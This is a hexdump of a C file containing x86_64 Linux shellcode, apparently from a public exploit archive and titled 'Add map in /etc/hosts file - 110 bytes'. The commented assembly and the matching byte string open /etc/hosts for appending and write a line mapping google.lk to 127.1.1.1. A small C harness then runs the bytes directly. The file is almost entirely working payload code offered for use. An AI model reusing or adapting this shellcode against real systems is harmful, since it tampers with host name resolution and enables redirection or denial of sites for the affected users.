00000000  2f 2a 0a 3b 20 54 69 74  6c 65 3a 20 41 64 64 20  |/*.; Title: Add |
00000010  6d 61 70 20 69 6e 20 2f  65 74 63 2f 68 6f 73 74  |map in /etc/host|
00000020  73 20 66 69 6c 65 20 2d  20 31 31 30 20 62 79 74  |s file - 110 byt|
00000030  65 73 0a 3b 20 44 61 74  65 3a 20 32 30 31 34 2d  |es.; Date: 2014-|
00000040  31 30 2d 32 39 0a 3b 20  50 6c 61 74 66 6f 72 6d  |10-29.; Platform|
00000050  3a 20 6c 69 6e 75 78 2f  78 38 36 5f 36 34 0a 3b  |: linux/x86_64.;|
00000060  20 57 65 62 73 69 74 65  3a 20 68 74 74 70 3a 2f  | Website: http:/|
00000070  2f 6f 73 61 6e 64 61 6d  61 6c 69 74 68 2e 77 6f  |/osandamalith.wo|
00000080  72 64 70 72 65 73 73 2e  63 6f 6d 0a 3b 20 41 75  |rdpress.com.; Au|
00000090  74 68 6f 72 3a 20 4f 73  61 6e 64 61 20 4d 61 6c  |thor: Osanda Mal|
000000a0  69 74 68 20 4a 61 79 61  74 68 69 73 73 61 20 28  |ith Jayathissa (|
000000b0  40 4f 73 61 6e 64 61 4d  61 6c 69 74 68 29 0a 0a  |@OsandaMalith)..|
000000c0  67 6c 6f 62 61 6c 20 5f  73 74 61 72 74 0a 20 20  |global _start.  |
000000d0  20 20 73 65 63 74 69 6f  6e 20 2e 74 65 78 74 0a  |  section .text.|
000000e0  0a 5f 73 74 61 72 74 3a  0a 20 20 20 20 3b 6f 70  |._start:.    ;op|
000000f0  65 6e 0a 20 20 20 20 78  6f 72 20 72 61 78 2c 20  |en.    xor rax, |
00000100  72 61 78 20 0a 20 20 20  20 61 64 64 20 72 61 78  |rax .    add rax|
00000110  2c 20 32 20 20 3b 20 6f  70 65 6e 20 73 79 73 63  |, 2  ; open sysc|
00000120  61 6c 6c 0a 20 20 20 20  78 6f 72 20 72 64 69 2c  |all.    xor rdi,|
00000130  20 72 64 69 0a 20 20 20  20 78 6f 72 20 72 73 69  | rdi.    xor rsi|
00000140  2c 20 72 73 69 0a 20 20  20 20 70 75 73 68 20 72  |, rsi.    push r|
00000150  73 69 20 3b 20 30 78 30  30 20 0a 20 20 20 20 6d  |si ; 0x00 .    m|
00000160  6f 76 20 72 38 2c 20 30  78 32 66 32 66 32 66 32  |ov r8, 0x2f2f2f2|
00000170  66 36 33 37 34 36 35 32  66 20 3b 20 73 74 73 6f  |f6374652f ; stso|
00000180  68 2f 0a 20 20 20 20 6d  6f 76 20 72 31 30 2c 20  |h/.    mov r10, |
00000190  30 78 37 33 37 34 37 33  36 66 36 38 32 66 32 66  |0x7374736f682f2f|
000001a0  32 66 20 3b 20 2f 63 74  65 2f 0a 20 20 20 20 70  |2f ; /cte/.    p|
000001b0  75 73 68 20 72 31 30 0a  20 20 20 20 70 75 73 68  |ush r10.    push|
000001c0  20 72 38 0a 20 20 20 20  61 64 64 20 72 64 69 2c  | r8.    add rdi,|
000001d0  20 72 73 70 0a 20 20 20  20 78 6f 72 20 72 73 69  | rsp.    xor rsi|
000001e0  2c 20 72 73 69 0a 20 20  20 20 61 64 64 20 73 69  |, rsi.    add si|
000001f0  2c 20 30 78 34 30 31 0a  20 20 20 20 73 79 73 63  |, 0x401.    sysc|
00000200  61 6c 6c 0a 0a 20 20 20  20 3b 77 72 69 74 65 0a  |all..    ;write.|
00000210  20 20 20 20 78 63 68 67  20 72 61 78 2c 20 72 64  |    xchg rax, rd|
00000220  69 0a 20 20 20 20 78 6f  72 20 72 61 78 2c 20 72  |i.    xor rax, r|
00000230  61 78 0a 20 20 20 20 61  64 64 20 72 61 78 2c 20  |ax.    add rax, |
00000240  31 20 3b 20 73 79 73 63  61 6c 6c 20 66 6f 72 20  |1 ; syscall for |
00000250  77 72 69 74 65 0a 20 20  20 20 6a 6d 70 20 64 61  |write.    jmp da|
00000260  74 61 0a 0a 77 72 69 74  65 3a 0a 20 20 20 20 70  |ta..write:.    p|
00000270  6f 70 20 72 73 69 20 0a  20 20 20 20 6d 6f 76 20  |op rsi .    mov |
00000280  64 6c 2c 20 31 39 20 3b  20 6c 65 6e 67 74 68 20  |dl, 19 ; length |
00000290  69 6e 20 72 64 78 0a 20  20 20 20 73 79 73 63 61  |in rdx.    sysca|
000002a0  6c 6c 0a 0a 20 20 20 20  3b 63 6c 6f 73 65 0a 20  |ll..    ;close. |
000002b0  20 20 20 78 6f 72 20 72  61 78 2c 20 72 61 78 0a  |   xor rax, rax.|
000002c0  20 20 20 20 61 64 64 20  72 61 78 2c 20 33 0a 20  |    add rax, 3. |
000002d0  20 20 20 73 79 73 63 61  6c 6c 0a 0a 20 20 20 20  |   syscall..    |
000002e0  3b 65 78 69 74 0a 20 20  20 20 78 6f 72 20 72 61  |;exit.    xor ra|
000002f0  78 2c 20 72 61 78 0a 20  20 20 20 6d 6f 76 20 61  |x, rax.    mov a|
00000300  6c 2c 20 36 30 0a 20 20  20 20 78 6f 72 20 72 64  |l, 60.    xor rd|
00000310  69 2c 20 72 64 69 0a 20  20 20 20 73 79 73 63 61  |i, rdi.    sysca|
00000320  6c 6c 20 0a 0a 64 61 74  61 3a 0a 20 20 20 20 63  |ll ..data:.    c|
00000330  61 6c 6c 20 77 72 69 74  65 0a 20 20 20 20 74 65  |all write.    te|
00000340  78 74 20 64 62 20 27 31  32 37 2e 31 2e 31 2e 31  |xt db '127.1.1.1|
00000350  20 67 6f 6f 67 6c 65 2e  6c 6b 27 0a 2a 2f 0a 0a  | google.lk'.*/..|
00000360  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000370  68 3e 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 72  |h>.#include <str|
00000380  69 6e 67 2e 68 3e 0a 0a  75 6e 73 69 67 6e 65 64  |ing.h>..unsigned|
00000390  20 63 68 61 72 20 63 6f  64 65 5b 5d 20 3d 20 20  | char code[] =  |
000003a0  22 5c 78 34 38 5c 78 33  31 5c 78 63 30 5c 78 34  |"\x48\x31\xc0\x4|
000003b0  38 5c 78 38 33 5c 78 63  30 5c 78 30 32 5c 78 34  |8\x83\xc0\x02\x4|
000003c0  38 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |8".             |
000003d0  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 33 31  |           "\x31|
000003e0  5c 78 66 66 5c 78 34 38  5c 78 33 31 5c 78 66 36  |\xff\x48\x31\xf6|
000003f0  5c 78 35 36 5c 78 34 39  5c 78 62 38 22 0a 20 20  |\x56\x49\xb8".  |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000410  20 20 20 20 20 20 22 5c  78 32 66 5c 78 36 35 5c  |      "\x2f\x65\|
00000420  78 37 34 5c 78 36 33 5c  78 32 66 5c 78 32 66 5c  |x74\x63\x2f\x2f\|
00000430  78 32 66 5c 78 32 66 22  0a 20 20 20 20 20 20 20  |x2f\x2f".       |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000450  20 22 5c 78 34 39 5c 78  62 61 5c 78 32 66 5c 78  | "\x49\xba\x2f\x|
00000460  32 66 5c 78 32 66 5c 78  36 38 5c 78 36 66 5c 78  |2f\x2f\x68\x6f\x|
00000470  37 33 22 0a 20 20 20 20  20 20 20 20 20 20 20 20  |73".            |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 37  |            "\x7|
00000490  34 5c 78 37 33 5c 78 34  31 5c 78 35 32 5c 78 34  |4\x73\x41\x52\x4|
000004a0  31 5c 78 35 30 5c 78 34  38 5c 78 30 31 22 0a 20  |1\x50\x48\x01". |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004c0  20 20 20 20 20 20 20 22  5c 78 65 37 5c 78 34 38  |       "\xe7\x48|
000004d0  5c 78 33 31 5c 78 66 36  5c 78 36 36 5c 78 38 31  |\x31\xf6\x66\x81|
000004e0  5c 78 63 36 5c 78 30 31  22 0a 20 20 20 20 20 20  |\xc6\x01".      |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000500  20 20 22 5c 78 30 34 5c  78 30 66 5c 78 30 35 5c  |  "\x04\x0f\x05\|
00000510  78 34 38 5c 78 39 37 5c  78 34 38 5c 78 33 31 5c  |x48\x97\x48\x31\|
00000520  78 63 30 22 0a 20 20 20  20 20 20 20 20 20 20 20  |xc0".           |
00000530  20 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |             "\x|
00000540  34 38 5c 78 38 33 5c 78  63 30 5c 78 30 31 5c 78  |48\x83\xc0\x01\x|
00000550  65 62 5c 78 31 38 5c 78  35 65 5c 78 62 32 22 0a  |eb\x18\x5e\xb2".|
00000560  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000570  20 20 20 20 20 20 20 20  22 5c 78 31 33 5c 78 30  |        "\x13\x0|
00000580  66 5c 78 30 35 5c 78 34  38 5c 78 33 31 5c 78 63  |f\x05\x48\x31\xc|
00000590  30 5c 78 34 38 5c 78 38  33 22 0a 20 20 20 20 20  |0\x48\x83".     |
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005b0  20 20 20 22 5c 78 63 30  5c 78 30 33 5c 78 30 66  |   "\xc0\x03\x0f|
000005c0  5c 78 30 35 5c 78 34 38  5c 78 33 31 5c 78 63 30  |\x05\x48\x31\xc0|
000005d0  5c 78 62 30 22 0a 20 20  20 20 20 20 20 20 20 20  |\xb0".          |
000005e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
000005f0  78 33 63 5c 78 34 38 5c  78 33 31 5c 78 66 66 5c  |x3c\x48\x31\xff\|
00000600  78 30 66 5c 78 30 35 5c  78 65 38 5c 78 65 33 22  |x0f\x05\xe8\xe3"|
00000610  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000620  20 20 20 20 20 20 20 20  20 22 5c 78 66 66 5c 78  |         "\xff\x|
00000630  66 66 5c 78 66 66 5c 78  33 31 5c 78 33 32 5c 78  |ff\xff\x31\x32\x|
00000640  33 37 5c 78 32 65 5c 78  33 31 22 0a 20 20 20 20  |37\x2e\x31".    |
00000650  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000660  20 20 20 20 22 5c 78 32  65 5c 78 33 31 5c 78 32  |    "\x2e\x31\x2|
00000670  65 5c 78 33 31 5c 78 32  30 5c 78 36 37 5c 78 36  |e\x31\x20\x67\x6|
00000680  66 5c 78 36 66 22 0a 20  20 20 20 20 20 20 20 20  |f\x6f".         |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |               "|
000006a0  5c 78 36 37 5c 78 36 63  5c 78 36 35 5c 78 32 65  |\x67\x6c\x65\x2e|
000006b0  5c 78 36 63 5c 78 36 62  22 3b 0a 0a 0a 69 6e 74  |\x6c\x6b";...int|
000006c0  0a 6d 61 69 6e 28 29 20  7b 0a 20 20 20 20 70 72  |.main() {.    pr|
000006d0  69 6e 74 66 28 22 53 68  65 6c 6c 63 6f 64 65 20  |intf("Shellcode |
000006e0  4c 65 6e 67 74 68 3a 20  20 25 64 5c 6e 22 2c 20  |Length:  %d\n", |
000006f0  28 69 6e 74 29 73 74 72  6c 65 6e 28 63 6f 64 65  |(int)strlen(code|
00000700  29 29 3b 0a 20 20 20 20  69 6e 74 20 28 2a 72 65  |));.    int (*re|
00000710  74 29 28 29 20 3d 20 28  69 6e 74 28 2a 29 28 29  |t)() = (int(*)()|
00000720  29 63 6f 64 65 3b 0a 20  20 20 20 72 65 74 28 29  |)code;.    ret()|
00000730  3b 0a 0a 7d 0a 2f 2a 45  4f 46 2a 2f              |;..}./*EOF*/|
0000073c
